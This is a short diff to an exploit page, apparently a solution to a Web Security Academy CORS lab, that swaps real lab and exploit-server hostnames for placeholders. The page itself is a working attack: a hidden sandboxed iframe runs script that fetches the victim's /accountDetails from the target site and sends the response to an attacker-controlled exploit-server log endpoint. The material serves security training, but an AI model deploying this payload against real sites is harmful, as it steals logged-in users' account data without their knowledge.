@@ -3,7 +3,7 @@
         <iframe style="display: none;" sandbox="allow-scripts"
         srcdoc="
         <script>
-            var url='https://0a1700c00347d89680920d68001c00ed.web-security-academy.net';
+            var url='https://[labid].web-security-academy.net';
 
             fetch(url + '/accountDetails', {
                 method:'GET',
@@ -16,7 +16,7 @@
             )
 
             .then(data=>{
-                fetch('https://exploit-0adf007503bed8c2809e0c1e01f2005a.exploit-server.net/log?key=' + encodeURIComponent(data)); 
+                fetch('https://exploit-[exploit server id].exploit-server.net/log?key=' + encodeURIComponent(data)); 
             })
 
             .catch(error => console.error('Error during exploit execution:', error));
